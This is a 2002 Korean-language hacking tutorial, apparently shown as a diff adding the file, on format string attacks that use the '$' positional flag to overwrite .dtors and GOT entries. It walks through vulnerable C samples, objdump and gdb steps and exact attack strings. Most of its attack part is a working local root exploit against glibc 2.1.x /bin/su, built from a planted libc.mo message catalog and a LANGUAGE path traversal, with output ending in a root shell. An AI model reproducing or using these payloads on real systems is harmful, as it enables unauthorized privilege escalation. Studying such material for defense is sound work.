@@ -1,0 +1,366 @@
+                  
+ |=======================================================================================|
+   Title: $-flag를 이용한 Format String 공격   
+   Author : 유동훈 (Xpl017Elz) in INetCop
+   E-mail : szoahc@hotmail.com
+   Home: http://x82.i21c.net
+   Date: 2002/01/31
+ |=======================================================================================|
+
+   0x00. Overview
+   0x01. 배경 설명
+   0x02. Return Address 찾기
+   0x02. Stack과의 거리 계산
+   0x03. 실제 적용되는 공격
+      -  exploit
+      -  result
+   0x04. End
+   0x05. Reference
+
+ |=======================================================================================|
+
+
+  0x00. Overview
+
+
+ 문서를 작성하면서 느낀것이지만, 지난 번 amadoh4ck님의 글에 전적으로 동의한다. 
+ 기술은 나날이 발전한다. 먼저 익힌 사람들의 조그만한 공유가 공부하는 많은 이들
+ 에게는 도움이 될것이라 생각한다. 우스운 이야기지만, 뒤늦게 문서를 공유하는 
+ 내 자신이 조금은 부끄럽게 느껴진다. 다른 해커님들의 멋진 공유를 바라며 ...
+
+ 어떻게 하면 더욱 더 나은 기술을 이용하고, 편리한 공격을 위해 연구에 열중하고 
+ 있는 여러 Hacker들에게 이 문서가 도움이 되었으면 한다. 
+ 내용상 부적절하거나 기타 문의 사항은 mail을 이용해주기 바란다.
+
+
+ 0x01. 배경 설명
+
+
+ 이미 잘 알려져 있듯이 Format String 공격은 많은 발전을 해왔다. 기존의 Format
+ String 공격은 약간의 계산을 필요로 한다. 기존에 알려진 Format String 공격법에 
+ 대해 간단히 짚고 넘어가도록 하겠다.
+
+ 1. 취약점 프로그램을 공격하기 위한 Shellcode를 준비한다.
+ -  현재 eggshell 프로그램으로 해결할수 있다.
+ 
+ 2. Shellcode가 저장된 Address를 찾은후 10진수로 변환하는 작업을 거친다.
+ 
+ 3. 실제 Stack에 입력되는 값과의 거리를 계산한다.
+ 
+ 4. 덮어 씌워질 Return Address를 찾는다.
+ -  .dtors를 이용하여 Return Address를 대처하여 공격할수 있다.
+
+ 5. 완성된 공격 String을 프로그램에 적용한다.
+
+ 대강 위와 비슷한 작업이 이뤄질것이다. eggshell을 이용하면 1번 문제를 해결할수 
+ 있고, .dtors를 이용한 Format String 기법을 이용하면 4번은 어렵지 않게 해결할수 
+ 있게 된다. 문제는 실제 Stack과의 거리값을 차감 계산에서 발생한다.
+
+
+ 0x01. Return Address 찾기
+
+ 
+ Stack Overflow 공격같은 경우는 Return Address를 Shellcode가 있는 주소로 변경하여
+ shell을 띄우는 방법을 채택해왔다. 물론, format string 공격 또한, 비슷한 방식을 
+ 사용해왔다. 하지만 format string 공격의 경우 Stack의 어느 부분이라도 덮어쓰기가 
+ 가능하기 때문에 컴파일후 변경되지 않는 ELF format 영역의 .dtors나 GOT (Global 
+ Offset Table) 섹션을 덮는 방식의 현명한 방법을 채택하게 되었다.
+
+ 간단한 방법으로 기존의 Return Address보다 정확한 영역을 알아낼수 있다.
+ 이 방법은 Guido Bakker가 작성한 글(Overwriting ELF .dtors section to modify program 
+ execution)을 보면 쉽게 이해할수 있다. 한국에는 amadoh4ck님이 작성한 글(.dtors를 이용
+ 한 Format string 자동화툴 설계)을 보면 이해할수 있으리라 생각된다.
+
+
+ + objdump tool로 Destructor Table section 알아내기
+
+
+ [x82@xpl017elz fmt]$ objdump -h program | grep .dtors
+  17 .dtors        00000008  0804961c  0804961c  0000061c  2**2
+ [x82@xpl017elz fmt]$     
+
+ 나온 값은 0x0804961c이다. 이 주소의 4byte후에는 클린업 함수의 주소가 존재하는데 이를 
+ 덮어쓰면 프로그램을 우리가 원하는 흐름으로 변경할수 있다. 
+
+
+ + objdump tool로 Global Offset Table section 알아내기
+
+
+ [x82@xpl017elz fmt]$ objdump --dynamic-reloc program | grep printf
+ 08049648 R_386_JUMP_SLOT   printf
+ [x82@xpl017elz fmt]$
+
+ 0x08049648 위 .dtors 섹션영역과 그리 멀지 않은 거리에 있음을 알수 있다.
+
+      
+ + gdb tool로 Global Offset Table section 알아내기
+
+
+ [x82@xpl017elz fmt]$ (printf "disass printf"; cat) | gdb -q program
+ (gdb)
+ Dump of assembler code for function printf:
+ 0x80483c8 <printf>:     jmp    *0x8049648
+ 0x80483ce <printf+6>:   push   $0x30
+ 0x80483d3 <printf+11>:  jmp    0x8048358 <_init+48>
+ End of assembler dump.
+ (gdb) 
+
+ 역시 disassemble 결과, "jmp   *0x8049648" Global Offset Table section이 출력되었다.
+
+
+ 0x02. Stack과의 거리 계산
+
+
+ 이번에는 번거로운 Stack과의 거리 계산작업을 할 차례이다. 아래, 간단한 예를 들어보겠다.
+
+ |= source: fmtbug1.c ===================================================================|
+                                   
+  #include <stdio.h>                
+                                    
+  main(int argc, char *argv[]) {    
+     char values[100];              
+     snprintf(values,80,argv[1]);   
+     printf(values); printf("\n");  
+  }                                                                     
+
+ |=======================================================================================|
+
+
+ 실행 결과:
+
+ [x82@xpl017elz fmt]$ ./fmtbug1 AAAA%8x
+ AAAA41414141   
+ [x82@xpl017elz fmt]$
+
+
+ |= source: fmtbug2.c ===================================================================|
+                                    
+  #include <stdio.h>                
+                                    
+  main(int argc, char *argv[]) {    
+     printf(argv[1]); printf("\n"); 
+  }                                 
+                                    
+ |=======================================================================================|
+
+
+ 실행 결과:    
+
+ [x82@xpl017elz fmt]$ ./fmtbug AAAA+`perl -e 'print "%8x"x84'`
+ AAAA+bffffae8400301eb       2bffffb14bffffb2040012024       2 8048320       0 804
+ 8341 80483c8       2bffffb14 8048298 804841c4000a610bffffb0c40012670       2bfff
+ fc0bbffffc14       0bffffd16bffffd30bffffd3ebffffd54bffffd61bffffd73bffffd8dbfff
+ fd98bffffda6bffffe04bffffe0fbffffe24bffffe34bffffe46bffffe50bffffe5fbffffe72bfff
+ fe7abffffe87bffffe8fbfffffe8       0       3 8048034       4      20       5
+    6       6    1000       740000000       8       0       9 8048320       b
+    0       c       0       d       0       e       0      10 387f9ff       fbfff
+ fc06       0       0       0       0       0       0       0       0       03669
+ 00002e003638746d662f  67756241414141
+ [x82@xpl017elz fmt]$
+
+ 
+ 첫번째 프로그램의 경우는 Stack거리 차감 계산없이 쉽게 exploit하여 공격이 가능
+ 하다. 하지만, 두번째의 경우는 약간 다르다. Stack과의 거리값이 크기 때문에 도달
+ 하기까지 출력해야 하는 변환문자를 많이 입력해야 그 값을 알수 있다. 이럴때는 
+ 전부 입력된 변환문자의 값을 구하여 변환된 10진수 Shellcode 주소에서 minus(-)
+ 해줘야 한다. 이 번거로운 작업은 Remote FTPD Format String공격과 Glibc Format 
+ String 공격시 악몽으로 기억된다. 만약 위의 첫번째 경우로 공격할수 있다면 쉬운
+ 계산으로도 공격을 성공할수 있을것이다.
+
+ 애초에 Andreas Thuemmel이란 사람은 "$-flag"를 이용하여 주어진 인수로 접근하는 
+ 편리한 방법을 제시하였다. 이 방법은 프로그램이 입력받는 공간중, 공격 문자열에 의한 
+ 공간을 줄여줄뿐만 아니라 정확한 계산을 통해 우리가 원하는 값으로 덮어씌우기를 시도
+ 할수 있다.
+
+ 그럼, 서로 다른 두가지의 방법으로 공격을 시도해본후 비교해보도록 하자.
+
+
+ 일반적인 공격 방법:
+
+
+ [x82@xpl017elz fmt]$ ls -la fmtbug2
+ -rwsr-xr-x   1 root     root        11700 Feb  7 21:23 fmtbug2
+ [x82@xpl017elz fmt]$ 
+ [x82@xpl017elz fmt]$ gcc -o eggshell eggshell.c
+ [x82@xpl017elz fmt]$ ./eggshell
+ Using address: 0xbffffb94
+ bash$ 
+
+ 0x 
+  b : 16 x 16 x 16 x 16 x 16 x 16 x 16 x b(11)
+  f : 16 x 16 x 16 x 16 x 16 x 16 x f(15)
+  f : 16 x 16 x 16 x 16 x 16 x f(15)
+  f : 16 x 16 x 16 x 16 x f(15)
+  f : 16 x 16 x 16 x f(15)
+  b : 16 x 16 x b(11)
+  9 : 16 x 9
+  4 : + 4
+
+ 0xfb94 : 64404
+ 0x1bfff(114687) - 0xfb94(64404) = 0xc46b(50283)
+ 64404 - 16(address) - 1(pad) - (84 * 8) = 63715
+
+ bash$ ./fmtbug2 `(printf "\x82\x82\x82\x82\x7c\x94\x04\x08\x82\x82\x82\x82\x7e\x9
+ 4\x04\x08")`+`perl -e 'print "%8x"x84'`%63715x%n%50283x%n
+ 굚굚굚굚+bffff0d8400301eb       2bffff104bffff11040012024       2 8048320
+ 0 8048341 80483c8       2bffff104 8048298 804841c4000a610bffff0fc40012670
+ 2bffff1ffbffff208       0bffff328bffff342bffff350bffff366bffff373bffff385bffff39
+ fbffff3aabffff3b8bffff416bffff421bffff436bffff446bffff450bffff650bffff65fbffffe5
+ fbffffe72bffffe7abffffe87bffffe8fbfffffe8       0       3 8048034       4      2
+ 0       5       6       6    1000       740000000       8       0       9 804832
+ 0       b       0       c       0       d       0       e       0      10 387f9f
+ f       fbffff1fa       0       0       0       0       0       0       0
+ 0       0366900002e003638746d662f  677562  
+
+
+          ... 중 략 ...
+
+                                          82828282         
+
+          ... 중 략 ...
+
+
+                                                         bash#
+
+
+ $-flag를 이용한 공격 방법:
+
+
+ 64404 - 16(address) - 1(pad) = 64387
+
+ bash$ ./fmtbug2 `(printf "\x82\x82\x82\x82\x7c\x94\x04\x08\x82\x82\x82\x82\x7e\x9
+ 4\x04\x08")`+%85\$64387x%86\$n%87\$50283x%88\$n 
+ 굚굚굚굚+
+
+
+          ... 중 략 ...
+
+                                          82828282
+
+          ... 중 략 ...
+
+
+                                                         bash#
+
+ 간단한 계산으로 String을 만들어 공격한 결과 쉽게 shell을 띄울수 있었다. 위의 String
+ 을 분석해보자. 
+
+ 
+ %85\$64387x // %86\$n // %87\$50283x // %88\$n 
+
+ 우리가 입력한 변환문자는 84개(%8x) + 4개(%63715x%n%50283x%n) 총, 88개이다.
+ 덮어씌울 Address가 존재하는것은 84개를 지나 85개 입력부터 인것이다.
+ 그렇다면, 위의 "$" flag는 무슨 역할을 하는것일까? 
+
+ 바로, 주어진 인수를 직접 쓰기하는것이다. 84개의 변환문자 출력없이도 한번에 공격자가 
+ 덮어씌울 Address로 점프하였다. 뿐만아니라 84개의 변환문자 입력이 없으므로 계산된 값
+ 을 따로 minus(-) 해줄 필요가 없다. 단지, 10진수로 변경한 Shellcode의 주소에서 덮어
+ 씌울 Address 16byte와 pad값 "+" 1byte를 minus(-)해주면 되는것이다. :-)
+
+ 
+ 0x03. 실제 적용되는 공격
+
+
+ 가장 대표적인 공격으로 Glibc 2.1.x 상에서 일어나는 /bin/su format string 공격을 시도
+ 해보도록 하겠다. 이 공격은 C library 파일에 공격 format string을 넣어서 error 출력시 
+ 프로그램이 파일의 내용을 참조하도록 하여 shell을 얻는 방법을 이용한다.
+
+ -  exploit
+
+ 일단, 프로그램이 참조할 C library 파일의 경로를 설정한다.
+
+ [x82@xpl017elz x82]$ ./eggshell
+ Using address: 0xbffffb88
+ bash$ LANGUAGE=ca_ES/../../../../../../tmp && export LANGUAGE
+ bash$ cd /tmp
+ bash$ mkdir LC_MESSAGES; cd LC_MESSAGES
+
+ 다음은 프로그램이 참조할 C library 파일의 내용이다.
+ 일반적인 공격으로는 입력한 변환문자 "%8x"를 전부 계산한후 10진수로 변환한 Shellcode 
+ 값에서 minus(-) 하여 값을 넣었다. 하지만, $-flag를 이용하면 이 작업은 무시해도 된다.   
+ 여기서 일반 format string 공격과의 다른점은 덮어쓰기 위한 Address 16byte를 계산하지
+ 않아도 된다는점이다. 이 Address는 su 프로그램의 인수로 적용되게 된다.
+
+ 0x 
+  b : 16 x 16 x 16 x 16 x 16 x 16 x 16 x b(11)
+  f : 16 x 16 x 16 x 16 x 16 x 16 x f(15)
+  f : 16 x 16 x 16 x 16 x 16 x f(15)
+  f : 16 x 16 x 16 x 16 x f(15)
+  f : 16 x 16 x 16 x f(15)
+  b : 16 x 16 x b(11)
+  8 : 16 x 8
+  8 : + 8
+
+ 0xfb94 : 64392
+ 0x1bfff(114687) - 0xfb88(64392) = 0xc477(50295)
+
+ bash$ cat > libc.po
+ msgid "%s: invalid option -- %c\n"
+ msgstr "%139$64392x%140$n%141$50295x%142$n\n"
+ ^O
+ bash$ msgfmt -o libc.mo libc.po && chmod 777 *
+
+ 다음은 /bin/su 프로그램의 인수로 잘못된 옵션을 집어넣어 format string을 일으킨다.
+ 이때, 우리가 덮을 su의 .dtors, GOT주소를 넣어준다. "+"가 3번 들어간 것은 pad값을
+ 이용하여 offset을 맞춘것이다. 
+
+ su -`(printf "\x82\x82\x82\x82\x24\xda\x04\x08\x82\x82\x82\x82\x26\xda\x04\x08")`+++
+
+ 공격할 String이 완성되었다. 자, 그럼 공격을 해보자.
+
+ -  result
+
+ bash$ ls -la /bin/su
+ -rwsr-xr-x   1 root     root      21672 Oct 23 00:34 /bin/su
+ bash$ id
+ uid=501(x82) gid=501(x82) groups=501(x82)
+ bash$ /bin/su -`(printf "\x82\x82\x82\x82\x24\xda\x04\x08\x82\x82\x82\x82\x26\xda\x04
+ \x08")`+++
+
+ 
+          ... 중 략 ...
+
+                                 82828282
+
+
+                                                 ... 중 략 ...
+
+
+                                                                         82828282
+ Try `su --help' for more information.
+ bash# 
+ bash# id
+ uid=501(x82) gid=501(x82) euid=0(root) groups=501(x82)
+ bash# whoami
+ root
+ bash#     
+
+ 공격이 성공하였다 :-)
+ 위와 같이 "$-flag"를 이용하면 Stack과의 거리 차감 계산법등의 번거로운 작업을 거치
+ 지 않아도 된다. 단, 사전에 변환문자를 이용하여 공격자가 입력하는 문자열이 어느 부
+ 분에 저장되는지 알아두어야 한다. FTPD Remote 공격은 여러분이 직접 exploit 해보길 
+ 바란다.
+
+
+ 0x04. End
+
+ 
+ 끝마침.
+
+ 그리 대단한 공격기법은 아니지만 format string을 공부하는 사람들에게 조금이나마 
+ 도움이 되었으면 한다. 여러모로 문서를 작성할수 있는 환경을 만들어 주신 INetCop Team
+ 에게 감사의 말을 전하며, 문서를 참조하여 공부하고 계신 여러 Hacker님들께도 감사드린다.
+
+
+ 0x05. Reference
+
+
+ - Overwriting ELF .dtors section to modify program execution (Author: Guido Bakker)
+
+ - .dtors를 이용한 Format string 자동화툴 설계 (Author: amadoh4ck)
+
+ - Analysis of Format String Bugs (Author: Andreas Thuemmel)
+
+ - http://61.37.177.32/~x82/BOX/etc_exploit/glibc-2.1.x/glibc-report.txt (Author: Xpl017Elz) /* ^-^ */
+
+
